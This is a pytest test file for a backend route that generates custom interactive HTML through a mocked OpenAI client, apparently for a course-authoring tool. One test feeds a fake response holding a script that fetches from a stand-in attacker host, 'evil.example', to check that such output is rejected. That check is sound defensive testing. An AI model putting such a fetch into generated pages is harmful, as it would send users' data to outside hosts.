"""Custom HTML generation must use the configured OpenAI integration."""
from __future__ import annotations

import sys
from pathlib import Path

import pytest
from fastapi import HTTPException

BACKEND_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BACKEND_ROOT))

from emergentintegrations.llm import chat as llm_chat  # noqa: E402
from routes import agent  # noqa: E402


class FakeLlmChat:
    captured: dict = {}
    response = """```html
<div class="game"><style>.game{color:#123}</style>
<button id="play">Jogar</button><script>
document.getElementById('play').onclick=()=>{document.body.dataset.played='1'};
</script></div>
```"""
    error: Exception | None = None

    def __init__(self, api_key, session_id, system_message=""):
        self.captured.update(
            api_key=api_key,
            session_id=session_id,
            system_message=system_message,
        )

    def with_model(self, provider, model):
        self.captured.update(provider=provider, model=model)
        return self

    def with_params(self, **params):
        self.captured["params"] = params
        return self

    async def send_message(self, message):
        self.captured["prompt"] = message.text
        if self.error:
            raise self.error
        return self.response


@pytest.fixture(autouse=True)
def reset_fake(monkeypatch):
    FakeLlmChat.captured = {}
    FakeLlmChat.response = """```html
<div class="game"><style>.game{color:#123}</style>
<button id="play">Jogar</button><script>
document.getElementById('play').onclick=()=>{document.body.dataset.played='1'};
</script></div>
```"""
    FakeLlmChat.error = None
    monkeypatch.setattr(llm_chat, "LlmChat", FakeLlmChat)
    monkeypatch.delenv("OPENAI_HTML_MODEL", raising=False)
    monkeypatch.delenv("OPENAI_TEXT_MODEL", raising=False)
    monkeypatch.delenv("OPENAI_TUTOR_MODEL", raising=False)


@pytest.mark.asyncio
async def test_custom_html_uses_openai_and_keeps_inline_interactivity(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "test-openai-key")
    monkeypatch.setenv("OPENAI_HTML_MODEL", "gpt-html-test")

    result = await agent.generate_html_with_ai(
        agent.GenerateHtmlRequest(
            prompt="Crie um jogo de termos técnicos",
            courseContext="Curso SCORMIFY",
        ),
        _user={"user_id": "author-1"},
    )

    assert FakeLlmChat.captured["provider"] == "openai"
    assert FakeLlmChat.captured["model"] == "gpt-html-test"
    assert FakeLlmChat.captured["params"]["temperature"] == 0.3
    assert "Curso SCORMIFY" in FakeLlmChat.captured["prompt"]
    assert result["html"].startswith("<div")
    assert "<script>" in result["html"]
    assert "```" not in result["html"]


@pytest.mark.asyncio
async def test_custom_html_reports_missing_openai_key(monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)

    with pytest.raises(HTTPException) as exc_info:
        await agent.generate_html_with_ai(
            agent.GenerateHtmlRequest(prompt="Crie um jogo educacional"),
            _user={"user_id": "author-1"},
        )

    assert exc_info.value.status_code == 503
    assert "OPENAI_API_KEY" in exc_info.value.detail


@pytest.mark.asyncio
async def test_custom_html_rejects_network_capabilities(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "test-openai-key")
    FakeLlmChat.response = (
        "<div>Jogo</div><script>fetch('https://evil.example/data')</script>"
    )

    with pytest.raises(HTTPException) as exc_info:
        await agent.generate_html_with_ai(
            agent.GenerateHtmlRequest(prompt="Crie um jogo educacional"),
            _user={"user_id": "author-1"},
        )

    assert exc_info.value.status_code == 422


@pytest.mark.asyncio
async def test_custom_html_maps_openai_quota_error(monkeypatch):
    monkeypatch.setenv("OPENAI_API_KEY", "test-openai-key")
    FakeLlmChat.error = RuntimeError("insufficient_quota: billing limit")

    with pytest.raises(HTTPException) as exc_info:
        await agent.generate_html_with_ai(
            agent.GenerateHtmlRequest(prompt="Crie um jogo educacional"),
            _user={"user_id": "author-1"},
        )

    assert exc_info.value.status_code == 503
    assert "saldo ou limite" in exc_info.value.detail
